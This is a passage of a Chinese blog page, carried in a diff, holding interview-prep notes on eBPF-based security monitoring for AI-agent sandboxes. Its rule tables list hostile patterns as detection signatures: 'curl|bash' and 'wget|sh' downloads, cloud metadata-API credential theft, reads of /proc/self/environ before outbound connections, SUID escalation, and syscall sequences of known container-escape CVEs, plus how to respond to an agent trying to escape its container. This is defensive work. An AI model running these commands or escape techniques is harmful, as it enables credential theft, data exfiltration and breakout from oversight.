+<td>未授权外联（数据外泄、C2 通信）</td>
+<td><strong>阻断</strong></td>
+</tr>
+<tr>
+<td>17</td>
+<td>LSM <code>security_socket_connect</code></td>
+<td>连接 <code>169.254.169.254:80</code>（云 metadata API）</td>
+<td>云凭证窃取（AWS/GCP/Azure IAM）</td>
+<td><strong>阻断</strong></td>
+</tr>
+<tr>
+<td>18</td>
+<td>LSM <code>security_socket_connect</code></td>
+<td>连接 <code>10.0.0.1:10250</code> 或 kubelet 端口</td>
+<td>K8s API / kubelet 未授权访问</td>
+<td><strong>阻断</strong></td>
+</tr>
+<tr>
+<td>19</td>
+<td>kprobe <code>udp_sendmsg</code></td>
+<td>DNS 查询域名不在白名单中</td>
+<td>DNS 隧道 / 探测内网 / 未授权域名访问</td>
+<td>阻断或记录</td>
+</tr>
+<tr>
+<td>20</td>
+<td>kprobe <code>tcp_sendmsg</code></td>
+<td>统计单位时间出站数据量</td>
+<td>大规模数据外泄</td>
+<td>超阈值（如 &gt;10MB/min）告警 + 限速</td>
+</tr>
+<tr>
+<td>21</td>
+<td>LSM <code>security_socket_create</code></td>
+<td>socket 类型为 <code>SOCK_RAW</code>（原始套接字）</td>
+<td>ICMP 隧道 / 网络扫描</td>
+<td>阻断</td>
+</tr>
+<tr>
+<td>22</td>
+<td>tracepoint <code>net:net_dev_xmit</code> + 包解析</td>
+<td>检测 DNS over HTTPS / DNS over TLS 到非白名单</td>
+<td>绕过 DNS 过滤的隐蔽通道</td>
+<td>阻断</td>
+</tr>
+</tbody></table>
+<h4 id="四、异常进程行为类"><a href="#四、异常进程行为类" class="headerlink" title="四、异常进程行为类"></a>四、异常进程行为类</h4><table>
+<thead>
+<tr>
+<th>#</th>
+<th>eBPF hook 点</th>
+<th>检测逻辑</th>
+<th>发现的风险</th>
+<th>处置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>23</td>
+<td>tracepoint <code>sched_process_exec</code></td>
+<td>执行的二进制不在白名单（python3, node, bash, sh, pip）</td>
+<td>未授权程序执行（如下载的恶意二进制）</td>
+<td>阻断或告警</td>
+</tr>
+<tr>
+<td>24</td>
+<td>tracepoint <code>sched_process_exec</code></td>
+<td>执行 <code>curl|bash</code>、<code>wget|sh</code>、<code>python -c &quot;import os; os.system()&quot;</code> 等模式</td>
+<td>远程代码下载执行</td>
+<td><strong>Critical 告警</strong></td>
+</tr>
+<tr>
+<td>25</td>
+<td>tracepoint <code>sched_process_fork</code></td>
+<td>统计单位时间内 fork 数量</td>
+<td>fork bomb（资源耗尽 DoS）</td>
+<td>超阈值（如 &gt;50/s）后 cgroup 冻结</td>
+</tr>
+<tr>
+<td>26</td>
+<td>tracepoint <code>sched_process_exec</code></td>
+<td>执行 <code>chmod +s</code>、<code>chown root</code> 等命令</td>
+<td>SUID 提权尝试</td>
+<td>告警</td>
+</tr>
+<tr>
+<td>27</td>
+<td>kprobe <code>__x64_sys_setuid</code> / <code>__x64_sys_setgid</code></td>
+<td>任何 setuid/setgid 调用</td>
+<td>权限提升</td>
+<td>阻断（Seccomp + eBPF 双重）</td>
+</tr>
+<tr>
+<td>28</td>
+<td>tracepoint <code>sched_process_exec</code></td>
+<td>执行 <code>pip install</code> / <code>npm install</code> + 包名不在预审白名单中</td>
+<td>供应链攻击（typosquatting、恶意包）</td>
+<td>告警 + 如果没走内部镜像则阻断</td>
+</tr>
+</tbody></table>
+<h4 id="五、资源滥用类"><a href="#五、资源滥用类" class="headerlink" title="五、资源滥用类"></a>五、资源滥用类</h4><table>
+<thead>
+<tr>
+<th>#</th>
+<th>eBPF hook 点</th>
+<th>检测逻辑</th>
+<th>发现的风险</th>
+<th>处置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>29</td>
+<td>cgroup 级别的 CPU/内存监控</td>
+<td>CPU 使用率持续 &gt;90% 超过 N 秒</td>
+<td>挖矿、死循环、资源抢占</td>
+<td>限速 + 告警</td>
+</tr>
+<tr>
+<td>30</td>
+<td>LSM <code>security_inode_create</code></td>
+<td><code>/tmp</code> 或 <code>/workspace</code> 下文件创建频率/总量</td>
+<td>磁盘填充 DoS</td>
+<td>超阈值后阻断新文件创建</td>
+</tr>
+<tr>
+<td>31</td>
+<td>tracepoint <code>sched_process_fork</code> + PID cgroup 限制</td>
+<td>PID 数量接近 cgroup limit</td>
+<td>fork bomb 的早期信号</td>
+<td>告警</td>
+</tr>
+</tbody></table>
+<h4 id="六、容器逃逸特征签名（基于已知-CVE-的精确匹配）"><a href="#六、容器逃逸特征签名（基于已知-CVE-的精确匹配）" class="headerlink" title="六、容器逃逸特征签名（基于已知 CVE 的精确匹配）"></a>六、容器逃逸特征签名（基于已知 CVE 的精确匹配）</h4><table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>特征 syscall 序列</th>
+<th>eBPF 检测点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE-2019-5736</td>
+<td><code>open(/proc/self/exe, O_PATH)</code> → <code>openat(/proc/self/fd/N, O_WRONLY)</code></td>
+<td>LSM <code>security_file_open</code> 组合规则</td>
+</tr>
+<tr>
+<td>CVE-2024-21626</td>
+<td><code>openat</code> 参数中出现 <code>/proc/self/fd/[0-9]+/../../..</code></td>
+<td>LSM <code>security_file_open</code> 路径正则</td>
+</tr>
+<tr>
+<td>CVE-2022-0492</td>
+<td><code>write(/sys/fs/cgroup/*/release_agent, ...)</code></td>
+<td>LSM <code>security_file_open</code> 写模式</td>
+</tr>
+<tr>
+<td>CVE-2019-14271</td>
+<td>容器内替换 <code>/usr/lib/libnss_*.so</code></td>
+<td>LSM <code>security_inode_rename</code> 目标路径</td>
+</tr>
+<tr>
+<td>通用内核提权</td>
+<td><code>commit_creds</code> 被调用且 uid 变为 0</td>
+<td>kprobe <code>commit_creds</code> + 前后 uid 对比</td>
+</tr>
+</tbody></table>
+<h4 id="七、规则之间的关联分析"><a href="#七、规则之间的关联分析" class="headerlink" title="七、规则之间的关联分析"></a>七、规则之间的关联分析</h4><p>单条规则触发可能是误报，多条规则的组合才是高置信度告警：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">低风险（单条触发 → 记录日志）：</span><br><span class="line">  - 访问了 &#x2F;workspace 外的一个文件</span><br><span class="line">  - 一次 DNS 查询到非白名单域名</span><br><span class="line"></span><br><span class="line">中风险（两条关联 → 告警）：</span><br><span class="line">  - 执行了 curl + 随后创建了新的可执行文件</span><br><span class="line">  - 读取了 &#x2F;proc&#x2F;self&#x2F;environ + 随后发起了外联网络连接</span><br><span class="line">  → 可能在偷 API key 然后外泄</span><br><span class="line"></span><br><span class="line">高风险（明确攻击特征 → 阻断 + kill + 销毁 VM）：</span><br><span class="line">  - 触发容器逃逸 CVE 签名中的任何一条</span><br><span class="line">  - commit_creds 检测到 uid 变为 0</span><br><span class="line">  - 连接 metadata API（169.254.169.254）</span><br><span class="line"></span><br><span class="line">关联分析时间窗口：同一容器 ID 内，30 秒内的事件做关联</span><br></pre></td></tr></table></figure>
+
+<h4 id="八、用-eBPF-应用上下文做语义级检测"><a href="#八、用-eBPF-应用上下文做语义级检测" class="headerlink" title="八、用 eBPF + 应用上下文做语义级检测"></a>八、用 eBPF + 应用上下文做语义级检测</h4><p>上面都是纯系统层规则。更高级的检测是<strong>把 eBPF 事件和 Agent 的 tool call 上下文关联</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">应用侧 (Agent Orchestrator) 通过 API 告知安全 pipeline：</span><br><span class="line">  &#123;container_id: &quot;abc123&quot;, tool: &quot;python_exec&quot;, task: &quot;数据分析&quot;, ts: 1712600000&#125;</span><br><span class="line"></span><br><span class="line">eBPF 侧在同一 container_id 同一时间窗口内采集到：</span><br><span class="line">  security_socket_connect → 连接外部 IP  ← 数据分析任务不应该外联</span><br><span class="line">  security_file_open → &#x2F;etc&#x2F;passwd       ← 数据分析任务不应该读系统文件</span><br><span class="line"></span><br><span class="line">语义级判定：</span><br><span class="line">  如果 tool&#x3D;python_exec 且 task&#x3D;数据分析：</span><br><span class="line">    允许：open(&#x2F;workspace&#x2F;*.csv), open(&#x2F;tmp&#x2F;*), 读 Python 标准库</span><br><span class="line">    告警：任何网络连接、访问 &#x2F;etc&#x2F; 下文件、执行非 python3 的二进制</span><br><span class="line"></span><br><span class="line">  如果 tool&#x3D;web_search：</span><br><span class="line">    允许：DNS 查询 + HTTP(S) 连接到白名单域名</span><br><span class="line">    告警：访问本地文件系统（&#x2F;workspace 除外）、执行 shell 命令</span><br><span class="line"></span><br><span class="line">  如果 tool&#x3D;file_write：</span><br><span class="line">    允许：写入 &#x2F;workspace&#x2F; 下的文件</span><br><span class="line">    告警：写入 &#x2F;workspace&#x2F; 外、创建可执行文件（+x 权限）、写入隐藏文件 (.*)</span><br></pre></td></tr></table></figure>
+
+<p>这种”<strong>系统遥测 + 应用语义</strong>“的组合检测，是 Agent 安全和传统容器安全最大的区别——传统容器安全只有系统层规则，但 Agent 的行为是否异常取决于它当前在执行什么任务。</p>
+</blockquote>
+<h3 id="Q-如果发现一个-Agent-正在尝试容器逃逸，怎么处置？"><a href="#Q-如果发现一个-Agent-正在尝试容器逃逸，怎么处置？" class="headerlink" title="Q: 如果发现一个 Agent 正在尝试容器逃逸，怎么处置？"></a>Q: 如果发现一个 Agent 正在尝试容器逃逸，怎么处置？</h3><blockquote>
+<p><strong>即时（秒级）：</strong> eBPF LSM 阻断（-EPERM）→ kill 进程 → cgroup/skb 断网<br><strong>短期（分钟级）：</strong> 销毁 VM → 保留 snapshot 取证 → 标记租户可疑<br><strong>事后：</strong> 回溯 eBPF 日志重建攻击链 → 关联应用层日志（哪个 prompt 触发的？）→ 更新策略</p>
+<p>逃逸尝试通常有明显 syscall 特征：打开 <code>/proc/self/exe</code>（5736）、访问 <code>/proc/self/fd/</code> 特殊 fd（21626）、写入 cgroup release_agent（0492）。这些可以在 eBPF LSM 中精确匹配。</p>
+</blockquote>
+<hr>
+<h2 id="九、行为面试"><a href="#九、行为面试" class="headerlink" title="九、行为面试"></a>九、行为面试</h2><h3 id="Q-最有成就感的项目？"><a href="#Q-最有成就感的项目？" class="headerlink" title="Q: 最有成就感的项目？"></a>Q: 最有成就感的项目？</h3><blockquote>
+<p>2021 年天府杯的 Docker 逃逸 + Ubuntu 本地提权利用链。需要串联内核漏洞提权 + 容器逃逸两个环节，每个都必须稳定可靠。内核利用要绕 KASLR、SMEP/SMAP，加上容器环境限制（有限 capabilities、seccomp），利用过程需要非常精细的控制。这个项目让我从整体理解了”容器内到 host root”的完整攻击路径。</p>
+</blockquote>
+<h3 id="Q-怎么快速学习新领域？"><a href="#Q-怎么快速学习新领域？" class="headerlink" title="Q: 怎么快速学习新领域？"></a>Q: 怎么快速学习新领域？</h3><blockquote>
+<p>三个阶段：<strong>建立全景认知</strong>（不追细节，先理解核心概念和关系）→ <strong>动手复现</strong>（拿一个 CVE 搭环境写 PoC，比读十篇综述深入得多）→ <strong>输出验证理解</strong>（写博客、出 CTF 题）。CTF 十年训练了这个能力——每场比赛都可能遇到全新领域。</p>
+</blockquote>
+<h3 id="Q-为什么想做-Agent-安全？"><a href="#Q-为什么想做-Agent-安全？" class="headerlink" title="Q: 为什么想做 Agent 安全？"></a>Q: 为什么想做 Agent 安全？</h3><blockquote>
+<p>从容器逃逸到 Agent Runtime 是自然延伸——Agent 本质上是运行在容器中的高权限不确定性 workload。传统容器安全假设 workload 行为可预测，但 AI Agent 打破了这个假设。传统方案不能直接用，需要新思路——这正是我感兴趣的，而且我的技能组合正好匹配。</p>
+</blockquote>
+<h3 id="Q-遇到分歧怎么办？"><a href="#Q-遇到分歧怎么办？" class="headerlink" title="Q: 遇到分歧怎么办？"></a>Q: 遇到分歧怎么办？</h3><blockquote>
+<p>用 PoC 说话——安全研究中，一个可复现的 exploit 胜过一百页文档。如果是架构分歧，基于具体场景的威胁模型来分析，没有绝对对错。</p>
+</blockquote>
+<h3 id="Q-你的技术盲区？"><a href="#Q-你的技术盲区？" class="headerlink" title="Q: 你的技术盲区？"></a>Q: 你的技术盲区？</h3><blockquote>
+<p>K8s 深度运维和 GPU 隔离经验相对少。但学习模式是”从攻击面切入”：K8s 从 RBAC、网络策略、准入控制切入；GPU 隔离从 NVIDIA Container Toolkit 攻击面开始（CVE-2025-23266）。CTF 十年证明了快速进入新领域的能力。</p>
+</blockquote>
+<h3 id="Q-对这个岗位的理解？你能带来什么？"><a href="#Q-对这个岗位的理解？你能带来什么？" class="headerlink" title="Q: 对这个岗位的理解？你能带来什么？"></a>Q: 对这个岗位的理解？你能带来什么？</h3><blockquote>
+<p>给 AI Agent 建立系统层面的安全保障。我能带来：</p>
+<ol>
+<li><strong>攻击者视角</strong>——50+ CVE 让我知道攻击者怎么攻</li>
+<li><strong>eBPF 深度</strong>——不仅会用，还知道 eBPF 自身的安全边界</li>
+<li><strong>容器逃逸实战</strong>——天府杯到多个 CVE 分析</li>
+<li><strong>技术输出能力</strong>——博客、出版物、CTF 出题</li>
+<li><strong>跨领域连接</strong>——同时理解系统层和 AI 应用层安全</li>
+</ol>
+</blockquote>
+<hr>
+<h2 id="十、交叉面专项：面试官是-eBPF-训练监控方向"><a href="#十、交叉面专项：面试官是-eBPF-训练监控方向" class="headerlink" title="十、交叉面专项：面试官是 eBPF 训练监控方向"></a>十、交叉面专项：面试官是 eBPF 训练监控方向</h2><blockquote>
+<p>以下问答专门针对训练监控背景的面试官，有些 eBPF 基础问题在前面章节已覆盖，这里聚焦于<strong>跨团队协作、性能敏感度、训练场景理解</strong>这些交叉面特有的考察点。</p>
+</blockquote>
+<h3 id="Q-你了解-eBPF-在-GPU-训练监控中的应用吗？"><a href="#Q-你了解-eBPF-在-GPU-训练监控中的应用吗？" class="headerlink" title="Q: 你了解 eBPF 在 GPU 训练监控中的应用吗？"></a>Q: 你了解 eBPF 在 GPU 训练监控中的应用吗？</h3><blockquote>
+<p>有一定了解。eBPF 在训练监控中的核心价值是<strong>非侵入式全栈可观测性</strong>——从内核 syscall、网络（RDMA/NCCL）、CPU 调度，到 CUDA 驱动调用，再到 PyTorch 算子层面，都可以通过 eBPF uprobe/kprobe 追踪，不需要修改训练框架代码。</p>
+<p>比如最近的研究：</p>
+<ul>
+<li><strong>eACGM</strong> 框架用 eBPF 做 AI/ML 系统的全栈监控，覆盖 GPU（通过 libnvml）、CUDA、PyTorch、网络通信层，用 GMM 做异常检测</li>
+<li><strong>eInfer</strong> 通过 eBPF 拦截 GPU 驱动的 ioctl 调用来重建 LLM 推理的完整执行时间线，开销在亚毫秒级</li>
+<li><strong>Mycroft</strong> 做 RDMA 级别的集合通信追踪，定位 all-reduce 中的 straggler</li>
+</ul>
+<p>这些和我做安全监控的技术栈高度重叠——底层的 eBPF 基础设施（程序加载、map 管理、事件传输）是可以共享的。</p>
+</blockquote>
+<h3 id="Q-安全监控的-eBPF-程序会不会影响训练性能？怎么控制开销？"><a href="#Q-安全监控的-eBPF-程序会不会影响训练性能？怎么控制开销？" class="headerlink" title="Q: 安全监控的 eBPF 程序会不会影响训练性能？怎么控制开销？"></a>Q: 安全监控的 eBPF 程序会不会影响训练性能？怎么控制开销？</h3><blockquote>
+<p>这是非常合理的顾虑。GPU 训练场景中，一个 all-reduce 被延迟几毫秒就会导致所有 worker 等待。原则是：<strong>安全监控绝不能成为训练瓶颈</strong>。</p>
+<ol>
+<li><strong>内核侧过滤</strong>：只监控 Agent 容器（通过 cgroup ID 过滤），训练 Pod 的事件直接跳过</li>
+<li><strong>避免热路径 hook</strong>：训练热路径是 GPU kernel launch、NCCL 通信、RDMA 操作——安全监控<strong>不 hook 这些</strong></li>
+<li><strong>ring buffer + batch 消费</strong>：设置合理的 wakeup_watermark，不是每个事件都唤醒用户态</li>
+<li><strong>量化开销</strong>：<code>bpftool prog profile</code> 监控每个 BPF 程序运行时间，目标单次 &lt; 1μs，整体 CPU &lt; 2%</li>
+<li><strong>分级监控</strong>：正常状态轻量级，告警状态增强，动态加载/卸载不影响训练</li>
+</ol>
+</blockquote>
+<h3 id="Q-安全监控和训练监控的-eBPF-程序会不会冲突？"><a href="#Q-安全监控和训练监控的-eBPF-程序会不会冲突？" class="headerlink" title="Q: 安全监控和训练监控的 eBPF 程序会不会冲突？"></a>Q: 安全监控和训练监控的 eBPF 程序会不会冲突？</h3><blockquote>
+<p>理论上不会——内核支持同一 hook 点上 attach 多个 BPF 程序。但需要协调：</p>
+<ul>
+<li><strong>LSM hook</strong>：安全监控的 LSM 通过 cgroup ID 判断，只对 Agent 容器生效，训练 Pod 直接放行</li>
+<li><strong>XDP</strong>：同一网卡只能一个 XDP 程序，需要用 libxdp dispatcher 或 tail call 协调</li>
+<li><strong>资源</strong>：BPF map 内存、ring buffer 都要 budget</li>
+</ul>
+<p><strong>最佳实践是共建 eBPF 平台层：</strong> 统一生命周期管理、统一数据管道（ring buffer → collector → Kafka，不同 topic）、统一资源限额。</p>
+</blockquote>
+<h3 id="Q-你写过-eBPF-程序吗？用什么框架？遇到过什么坑？"><a href="#Q-你写过-eBPF-程序吗？用什么框架？遇到过什么坑？" class="headerlink" title="Q: 你写过 eBPF 程序吗？用什么框架？遇到过什么坑？"></a>Q: 你写过 eBPF 程序吗？用什么框架？遇到过什么坑？</h3><blockquote>
+<p>写过。框架：<strong>libbpf + C</strong>（生产首选）、<strong>bpftrace</strong>（快速原型）、**cilium/ebpf (Go)**。BCC 已不是主流。</p>
+<p>踩过的坑：</p>
+<ol>
+<li><strong>Verifier 复杂度爆炸</strong>：用 tail call 拆分、简化分支、用 map 替代 if-else</li>
+<li><strong>指针安全检查</strong>：每级解引用前都要 <code>bpf_probe_read_kernel</code> 或 <code>BPF_CORE_READ</code></li>
+<li><strong>字符串处理</strong>：BPF 中不能 strlen/strcmp，从 dentry 逐级读 <code>d_name</code> 或比较 inode</li>
+<li><strong>BTF 不可用</strong>：老内核需 fallback 到硬编码偏移</li>
+<li><strong>Map 内存泄漏</strong>：hash map 没做 GC，满了后新 entry 插入失败。用 LRU map 或用户态定期清理</li>
+</ol>
+</blockquote>
+<h3 id="Q-你觉得安全团队和训练监控团队怎么协作最好？"><a href="#Q-你觉得安全团队和训练监控团队怎么协作最好？" class="headerlink" title="Q: 你觉得安全团队和训练监控团队怎么协作最好？"></a>Q: 你觉得安全团队和训练监控团队怎么协作最好？</h3><blockquote>
+<ol>
+<li><strong>共建平台层</strong>：统一 BPF 程序管理 + 数据管道 + 资源治理</li>
+<li><strong>互相提供价值</strong>：训练监控的行为基线帮安全排除误报；安全的容器/进程元数据帮训练监控做 Pod 级归因</li>
+<li><strong>避免踩脚</strong>：明确 hook 点分工，共享 hook 点时商量过滤策略</li>
+<li><strong>联合排障</strong>：训练变慢时快速定位是 BPF 开销还是安全策略限制</li>
+</ol>
+</blockquote>
+<h3 id="Q-你对-RDMA-和-NCCL-了解多少？"><a href="#Q-你对-RDMA-和-NCCL-了解多少？" class="headerlink" title="Q: 你对 RDMA 和 NCCL 了解多少？"></a>Q: 你对 RDMA 和 NCCL 了解多少？</h3><blockquote>
+<p>坦诚说深度使用经验不多，但了解架构：</p>
+<p><strong>RDMA</strong>：绕过 CPU 和内核协议栈，网卡直接读写远端内存。从安全角度关注：RDMA 绕过内核网络栈，<strong>eBPF 的 XDP/TC 看不到 RDMA 流量</strong>——需要在 Verbs 层 uprobe 或依赖硬件监控。</p>
+<p><strong>NCCL</strong>：NVIDIA 集合通信库（all-reduce、all-gather 等），底层走 RDMA/TCP/NVLink。2.27+ 新增 profiler plugin API。</p>
+<p>安全视角：RDMA memory region 配置不当可能暴露内存；多租户共享 RDMA 需确保 QP 隔离。</p>
+</blockquote>
+<h3 id="Q-你怎么看-eBPF-程序自身的安全性？"><a href="#Q-你怎么看-eBPF-程序自身的安全性？" class="headerlink" title="Q: 你怎么看 eBPF 程序自身的安全性？"></a>Q: 你怎么看 eBPF 程序自身的安全性？</h3><blockquote>
+<p>这正是我在 STAR Labs 做审计的核心方向。训练监控团队应该关心：</p>
+<ol>
+<li><strong>Verifier 不是万能的</strong>——我发现过多个 verifier bug，精心构造的 BPF 程序可能越界读写内核内存</li>
+<li><strong>BPF 程序可以读内核内存</strong>——<code>bpf_probe_read_kernel</code> 读任意地址，恶意程序可泄漏敏感数据</li>
+<li><strong>DoS 风险</strong>——热路径上的频繁 hash lookup 可消耗 CPU</li>
+<li><strong>Map 数据泄漏</strong>——需要通过 bpffs 权限和 BPF token（6.9+）控制访问</li>
+</ol>
+<p>缓解：<code>unprivileged_bpf_disabled=2</code>、只允许受信任进程加载 BPF（<code>CAP_BPF</code> + <code>CAP_PERFMON</code>）。我的审计经验可以帮团队 review BPF 程序安全性。</p>
+</blockquote>
+<h3 id="交叉面沟通策略"><a href="#交叉面沟通策略" class="headerlink" title="交叉面沟通策略"></a>交叉面沟通策略</h3><table>
+<thead>
+<tr>
+<th>场景</th>
+<th>应对</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>面试官问 eBPF 深度细节</td>
+<td>正面回答，你有审计经验，内功扎实</td>
+</tr>
+<tr>
+<td>面试官问训练/NCCL/RDMA 细节</td>
+<td>诚实说深度有限，但展示框架理解和安全视角，强调学习能力</td>
+</tr>
+<tr>
+<td>面试官担心安全监控影响性能</td>
+<td>重点：内核侧过滤、避免热路径 hook、量化开销、动态加载</td>
+</tr>
+<tr>
+<td>面试官问协作方式</td>
+<td>强调共建 eBPF 平台、互相提供价值、你能帮做安全 review</td>
+</tr>
+<tr>
+<td>冷场时</td>
+<td>反问：”你们用什么框架写 BPF 程序？遇到过 verifier 的什么坑？”</td>
+</tr>
+</tbody></table>
+<p><strong>核心姿态：</strong> 不要假装懂训练监控所有细节。展示的是——我在 eBPF 安全方向有你没有的深度（verifier bug、内核攻击面），同时尊重你的领域、能快速学习、愿意协作。两个方向的 eBPF 能力是互补的。</p>
+<hr>
+<h2 id="十一、反问面试官-amp-复习清单"><a href="#十一、反问面试官-amp-复习清单" class="headerlink" title="十一、反问面试官 &amp; 复习清单"></a>十一、反问面试官 &amp; 复习清单</h2><h3 id="反问面试官的问题"><a href="#反问面试官的问题" class="headerlink" title="反问面试官的问题"></a>反问面试官的问题</h3><ol>
+<li>“当前 Agent Runtime 的隔离方案是什么？遇到的最大挑战是什么？”</li>
+<li>“团队在 eBPF 的使用程度？是已有基础设施还是从零开始？”</li>
+<li>“Code Interpreter 目前是跑在容器里还是 microVM 里？”</li>
+<li>“有没有遇到过真实的 Agent 安全事件（比如 prompt injection 导致的越权操作）？”</li>
+<li>“团队对安全研究产出（如博客、会议分享）的态度？”</li>
+</ol>
+<h3 id="面试前一晚快速复习清单"><a href="#面试前一晚快速复习清单" class="headerlink" title="面试前一晚快速复习清单"></a>面试前一晚快速复习清单</h3><ul>
+<li><input disabled="" type="checkbox"> eBPF 程序类型、map 类型、verifier 机制（第二章）</li>
+<li><input disabled="" type="checkbox"> kprobe vs fentry vs tracepoint vs uprobe 的区别和开销（2.2 + 2.3）</li>
+<li><input disabled="" type="checkbox"> BPF LSM 的 attach 方式和使用场景（2.2）</li>
+<li><input disabled="" type="checkbox"> Namespace（8种）、Seccomp BPF、capabilities（第四章）</li>
+<li><input disabled="" type="checkbox"> 容器逃逸经典 CVE（5736、21626、0492）的原理和修复（第四章）</li>
+<li><input disabled="" type="checkbox"> OWASP Agentic AI Top 10（2026 版）</li>
+<li><input disabled="" type="checkbox"> Prompt Injection 直接/间接分类，Tool Use 攻击面（第七章）</li>
+<li><input disabled="" type="checkbox"> 自己的 CVE 列表中每个的一句话描述</li>
+<li><input disabled="" type="checkbox"> 安全监控的性能开销控制策略（第十章）</li>
+<li><input disabled="" type="checkbox"> 安全团队与训练监控团队的协作模式（第十章）</li>
+</ul>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://www.armosec.io/blog/ebpf-based-ai-agent-enforcement/">eBPF for AI Agent Enforcement - ARMO</a></li>
+<li><a href="https://opensource.microsoft.com/blog/2026/04/02/introducing-the-agent-governance-toolkit-open-source-runtime-security-for-ai-agents/">Microsoft Agent Governance Toolkit</a></li>
+<li><a href="https://arxiv.org/html/2603.02277v1">SandboxEscapeBench - arXiv</a></li>
+<li><a href="https://arxiv.org/html/2511.18155v1">eBPF-PATROL - arXiv</a></li>
+<li><a href="https://ebpf.foundation/ant-group-secures-their-platform-with-kata-containers-and-ebpf-for-fine-grained-control/">Ant Group Kata + eBPF</a></li>
+<li><a href="https://genai.owasp.org/llmrisk/llm01-prompt-injection/">OWASP LLM Top 10 - Prompt Injection</a></li>
+<li><a href="https://blaxel.ai/blog/container-escape">Container Escape for AI Agents - Blaxel</a></li>
+<li><a href="https://arxiv.org/html/2602.22724v1">AgentSentry - arXiv</a></li>
+<li><a href="https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/">Agents Rule of Two - Simon Willison</a></li>
+<li><a href="https://arxiv.org/abs/2506.02007">eACGM: eBPF-based ML Monitoring - arXiv</a></li>
+<li><a href="https://annanay.dev/gpu-observability-using-ebpf/">GPU Observability with eBPF - Annanay Agarwal</a></li>
+</ul>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+        </div>
+      
+    </main>
+
+    <footer class="footer">
+  <div class="footer-content">
+    <div class="footer-left">
+      
+      <span class="copyright">
+        &copy; 2015 - 2026 Swing
+      </span>
+    </div>
+
+    <div class="footer-right">
+      
+        <span class="powered">
+          Powered by Hexo <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+        </span>
+      
+      
+        <span class="theme-info">
+          Theme <a href="https://github.com/WinMin/hexo-theme-Bloom" target="_blank" rel="noopener">Bloom</a>
+        </span>
+      
+    </div>
+  </div>
+
+  
+    <div class="footer-social">
+      
+        <a href="https://github.com/WinMin" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
+          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+        </a>
+      
+      
+        <a href="https://twitter.com/bestswngs" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
+          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        </a>
+      
+      
+      
+        <a href="mailto:ask@mail.exp.sh" class="social-link" aria-label="Email">
+          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+        </a>
+      
+      
+        <a href="/atom.xml" class="social-link" aria-label="RSS">
+          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1z"/></svg>
+        </a>
+      
+    </div>
+  
+</footer>
+
+  </div>
+
+  <!-- Main Script -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Search -->
+
+
+<script src="/js/search.js"></script>
+
+
+
+<!-- Baidu Analytics -->
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+  var s = document.getElementsByTagName("script")[0];
